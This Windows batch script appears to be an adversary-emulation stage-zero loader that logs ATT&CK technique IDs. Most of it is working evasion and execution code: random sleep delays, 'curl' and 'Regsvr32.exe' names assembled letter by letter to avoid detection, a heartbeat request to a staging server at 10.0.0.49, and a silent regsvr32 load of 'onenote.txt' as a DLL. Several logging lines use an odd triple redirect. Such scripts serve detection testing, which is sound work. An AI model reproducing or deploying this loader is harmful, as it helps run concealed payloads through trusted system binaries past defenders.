@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ placeholder constants - plain literals
SET yktnwwf=%APPDATA%\7779\d259887d
SET fpakbq=Macula-Stage0-7779
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?7779-10
SET omxgazu=BALAM-S2BO
SET yydue=10
SET edjwtl=onenote.txt
SET fpldhe=7779

REM Internal variables for logging
SET bgnjk=%APPDATA%\!yydue!\macula-simulations.log
SET kclpx=T1218|SignedBinaryProxyExecution
SET nzmyq=
SET yrtbn=

REM Initial delay evasion
SET /A dl1=%RANDOM% %% 31 + 30
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: initial_delay=!dl1!s>>> "!bgnjk!" 2>nul
timeout /t !dl1! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: initial_delay_complete>>> "!bgnjk!" 2>nul

REM Character-by-character LOLBin obfuscation for curl
SET qmrt=c
SET mjpl=u
SET vxkl=r
SET zdxc=l
SET crxq=%qmrt%%mjpl%%vxkl%%zdxc%
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: built_lolbin=!crxq!>>> "!bgnjk!" 2>nul

ping -n 8 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: ping_delay_complete>>> "!bgnjk!" 2>nul

REM Stage 1: Heartbeat check to server
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_check_start>>> "!bgnjk!" 2>nul
!crxq! -k -s -o nul "!rdzgrnne!"
IF !ERRORLEVEL! EQU 0 (
    SET nzmyq=1
    SET yrtbn=
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_success>>> "!bgnjk!" 2>nul
) ELSE (
    SET nzmyq=0
    SET yrtbn=connection_failed
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_failed=!ERRORLEVEL!>>> "!bgnjk!" 2>nul
)

REM TTP logging for heartbeat
(
    echo [!DATE! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-T1105|IngressToolTransfer=[!nzmyq!]:[!yrtbn!]
) >> "!bgnjk!" 2>nul

CHOICE /C Y /N /D Y /T 12 >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: choice_delay_complete>>> "!bgnjk!" 2>nul

REM Change to output directory
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_start=!yktnwwf!>>> "!bgnjk!" 2>nul
cd /d "!yktnwwf!" >nul 2>&1
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_result=!CD!>>> "!bgnjk!" 2>nul

SET /A dl2=%RANDOM% %% 15 + 5
timeout /t !dl2! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: random_delay_complete=!dl2!s>>> "!bgnjk!" 2>nul

REM Character-by-character obfuscation for Regsvr32
SET ptzw=R
SET hqwe=e
SET bvmn=g
SET jklp=s
SET vbnm=v
SET xcvr=r
SET qwsz=3
SET mnbv=2
SET lkjh=.
SET poiuy=e
SET ytre=x
SET mvnb=e
SET dskje=%WINDIR%\System32\%ptzw%%hqwe%%bvmn%%jklp%%vbnm%%xcvr%%qwsz%%mnbv%%lkjh%%poiuy%%ytre%%mvnb%
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: built_regsvr32=!dskje!>>> "!bgnjk!" 2>nul

REM Build arguments with substitution encoding
SET argenc=Xse
SET args=!argenc:X=/!
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: built_args=!args!>>> "!bgnjk!" 2>nul

REM Execute DLL via Regsvr32
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: dll_load_start=!edjwtl!>>> "!bgnjk!" 2>nul
!dskje! !args! "!edjwtl!"
IF !ERRORLEVEL! EQU 0 (
    SET nzmyq=1
    SET yrtbn=
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: dll_load_success>>> "!bgnjk!" 2>nul
) ELSE (
    SET nzmyq=0
    SET yrtbn=exitcode_!ERRORLEVEL!
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: dll_load_failed=!ERRORLEVEL!>>> "!bgnjk!" 2>nul
)

ping -n 10 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: final_delay_complete>>> "!bgnjk!" 2>nul

REM TTP logging for T1218 execution
(
    echo [!DATE! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-!kclpx!=[!nzmyq!]:[!yrtbn!]
) >> "!bgnjk!" 2>nul

echo [!DATE! !TIME!][DEBUG][!omxgazu!]: script_complete>>> "!bgnjk!" 2>nul

ENDLOCAL
exit /b 0